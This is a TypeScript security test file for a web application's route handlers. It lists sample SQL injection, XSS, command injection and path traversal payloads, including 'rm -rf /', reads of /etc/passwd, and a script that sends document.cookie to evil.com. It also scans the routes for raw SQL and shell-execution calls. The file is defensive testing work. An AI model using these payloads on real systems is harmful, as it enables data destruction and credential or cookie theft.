import assert from "node:assert/strict";
import fs from "node:fs";
import path from "node:path";
import test from "node:test";

const MALICIOUS_PAYLOADS = {
  sqlInjection: [
    "'; DROP TABLE users; --",
    "1' OR '1'='1",
    "admin'--",
    "1; SELECT * FROM pg_tables",
  ],
  xss: [
    '<script>alert("xss")</script>',
    '<img src=x onerror=alert("xss")>',
    'javascript:alert("xss")',
    '"><script>document.location="http://evil.com/?c="+document.cookie</script>',
  ],
  commandInjection: [
    "; rm -rf /",
    "| cat /etc/passwd",
    "$(whoami)",
    "`id`",
    "192.168.1.1; cat /etc/passwd",
  ],
  pathTraversal: [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "%2e%2e%2f%2e%2e%2f",
  ],
} as const;

const SRC_DIR = path.resolve(process.cwd(), "src", "routes");

const PRIORITY_ENDPOINT_FILES: Array<{ file: string; routeAnchor: RegExp }> = [
  { file: "businessFlowRoutes.ts", routeAnchor: /router\.post\('\/'/ },
  { file: "runbookRoutes.ts", routeAnchor: /router\.post\("\/generate"/ },
  { file: "remediationTaskRoutes.ts", routeAnchor: /router\.post\("\/"/ },
  { file: "praExerciseRoutes.ts", routeAnchor: /router\.post\("\/"/ },
  { file: "financialRoutes.ts", routeAnchor: /router\.put\('\/org-profile'/ },
  { file: "financialRoutes.ts", routeAnchor: /router\.put\('\/node\/:nodeId\/override'/ },
  { file: "discoveryRoutes.ts", routeAnchor: /router\.post\(\s*"\/scan"/ },
];

test("payload corpus covers SQL, XSS, command injection and traversal vectors", () => {
  const payloads = Object.values(MALICIOUS_PAYLOADS).flat();
  assert.ok(payloads.length >= 10, "malicious payload set is unexpectedly small");
  assert.ok(payloads.some((value) => value.includes("DROP TABLE")), "SQL payload coverage is incomplete");
  assert.ok(payloads.some((value) => value.includes("<script>")), "XSS payload coverage is incomplete");
  assert.ok(payloads.some((value) => value.includes("$(whoami)")), "command payload coverage is incomplete");
  assert.ok(payloads.some((value) => value.includes("../")), "path traversal coverage is incomplete");
});

test("priority write endpoints include explicit 400 validation paths", () => {
  const failures: string[] = [];
  for (const target of PRIORITY_ENDPOINT_FILES) {
    const fullPath = path.join(SRC_DIR, target.file);
    const content = fs.readFileSync(fullPath, "utf8");
    if (!target.routeAnchor.test(content)) {
      failures.push(`${target.file} missing expected route anchor`);
      continue;
    }
    if (!/res\.status\(400\)/.test(content) && !/buildValidationError/.test(content)) {
      failures.push(`${target.file} has no explicit 400 validation path`);
    }
  }

  assert.equal(
    failures.length,
    0,
    `Validation coverage gaps on priority endpoints: ${failures.join(", ")}`
  );
});

test("no unsafe SQL or shell execution primitives in route handlers", () => {
  const routeFiles = fs.readdirSync(SRC_DIR).filter((name) => name.endsWith(".ts"));
  const findings: string[] = [];

  for (const file of routeFiles) {
    const content = fs.readFileSync(path.join(SRC_DIR, file), "utf8");
    if (/\$queryRawUnsafe|\$executeRawUnsafe/.test(content)) {
      findings.push(`${file}: uses unsafe raw SQL`);
    }
    if (/\bexecSync?\s*\(|\bspawnSync?\s*\(/.test(content)) {
      findings.push(`${file}: uses shell execution primitive`);
    }
  }

  assert.equal(findings.length, 0, findings.join(", "));
});
